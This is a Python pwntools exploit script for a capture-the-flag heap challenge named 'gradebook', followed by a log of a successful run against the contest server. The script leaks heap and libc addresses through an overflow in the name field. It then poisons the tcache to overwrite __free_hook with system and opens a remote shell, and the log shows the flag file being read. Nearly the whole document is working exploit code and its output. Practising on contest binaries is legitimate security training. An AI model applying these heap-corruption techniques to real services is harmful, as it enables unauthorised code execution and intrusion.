from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './gradebook'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "ctf.k3rn3l4rmy.com"
  PORT = 2250
  s = remote(HOST, PORT)
  libc = ELF("./libc.so.6")
else:
  s = process(BINARY)
  libc = elf.libc

def Add(idx, length, name):
  s.sendlineafter("> ",  str('1'))
  s.sendlineafter("id: \n", idx)
  s.sendlineafter("length: \n", str(length))
  s.sendlineafter("name: \n", name) 
  
def List():
  s.sendlineafter("> ", "2")  
  
def Update_grade(idx, grade):
  s.sendlineafter("> ", "3")    
  s.sendlineafter("id: \n", idx)
  s.sendlineafter("Enter grade: ", str(grade))
    
def Update_name(idx, name):
  s.sendlineafter("> ", "4")    
  s.sendlineafter("id: \n", idx)
  s.sendlineafter("name: \n", name)

def Clear():
  s.sendlineafter("> ", "5")    


Add("0", 0x18, "A"*0x10)
Add("1", 0x18, "B"*0x10)
Add("2", 0x18, "C"*0x10)
Add("3", 0x18, "D"*0x10)
Add("4", 0x440, "E"*0x10)
Add("5", 0x28, "F"*0x10)
Clear()

Add("0", 0x18, "/bin/sh\x00")
Add("1", 0x18, "B"*0x10)
Add("2", 0x18, "C"*0x10)
Add("3", 0x18, "D"*0x10)

# heap leak
Update_grade("1", 0x3100000001)
buf  = b"E"*0x18 + p64(0x21)
buf += p64(0x32) + p64(0x18ffffffff)
buf += b'\xd0'
Update_name("1", buf)

List()
for i in range(3):
  s.recvuntil("NAME: ")
heap_leak = u64(s.recvuntil('\n')[:-1] + b"\x00\x00")
heap_base = heap_leak - 0x810
print("heap_leak =", hex(heap_leak))
print("heap_base =", hex(heap_base))

# libc leak
Update_grade("1", 0x3800000001)
buf  = b"E"*0x18 + p64(0x21)
buf += p64(0x32) + p64(0x18ffffffff)
buf += p64(heap_base + 0x3c0)
Update_name("1", buf)

List()
for i in range(3):
  s.recvuntil("NAME: ")
libc_leak = u64(s.recvuntil('\n')[:-1] + b"\x00\x00")
libc_base = libc_leak - libc.sym.__malloc_hook - 0x70
free_hook = libc_base + libc.sym.__free_hook
system_addr = libc_base + libc.sym.system
print("libc_leak =", hex(libc_leak))
print("libc_base =", hex(libc_base))

# tcache poisoning
buf  = b"E"*0x18 + p64(0x21)
buf += p64(0x32) + p64(0x18ffffffff)
buf += p64(heap_base + 0x360)
Update_name("1", buf)
Update_name("2", p64(free_hook))

# Start /bin/sh
Add("4", 0x18, p64(system_addr))
Clear()
    
s.interactive()

'''
mito@ubuntu:~/CTF/K3RN3LCTF/Pwn_Gradebook$ python3 solve.py r
[*] '/home/mito/CTF/K3RN3LCTF/Pwn_Gradebook/gradebook'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to ctf.k3rn3l4rmy.com on port 2250: Done
[*] '/home/mito/CTF/K3RN3LCTF/Pwn_Gradebook/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
solve.py:19: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendlineafter("> ",  str('1'))
/home/mito/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
solve.py:20: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendlineafter("id: \n", idx)
solve.py:21: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendlineafter("length: \n", str(length))
solve.py:22: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendlineafter("name: \n", name)
solve.py:38: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendlineafter("> ", "5")
solve.py:28: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendlineafter("> ", "3")
solve.py:29: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendlineafter("id: \n", idx)
solve.py:30: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendlineafter("Enter grade: ", str(grade))
solve.py:33: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendlineafter("> ", "4")
solve.py:34: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendlineafter("id: \n", idx)
solve.py:25: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendlineafter("> ", "2")
solve.py:63: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.recvuntil("NAME: ")
solve.py:64: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  heap_leak = u64(s.recvuntil('\n')[:-1] + b"\x00\x00")
heap_leak = 0x55f61c5b9810
heap_base = 0x55f61c5b9000
solve.py:78: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.recvuntil("NAME: ")
solve.py:79: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  libc_leak = u64(s.recvuntil('\n')[:-1] + b"\x00\x00")
libc_leak = 0x7f89541ffbe0
libc_base = 0x7f8954014000
[*] Switching to interactive mode

$ id
uid=1000 gid=1000 groups=1000
$ ls -l
total 2224
-rw-rw-r-- 1 nobody nogroup      24 Nov  8 06:01 flag.txt
-rwxr-xr-x 1 nobody nogroup   21328 Nov 11 04:01 gradebook
-rwxrwxr-x 1 nobody nogroup  191472 Nov 11 04:00 ld-linux-x86-64.so.2
-rwxr-xr-x 1 nobody nogroup 2029224 Nov  8 06:01 libc.so.6
-rwxr-xr-x 1 nobody nogroup   21328 Nov 11 04:01 run
$ cat flag.txt
flag{e@zy_h3ap_i5_3asy}
'''
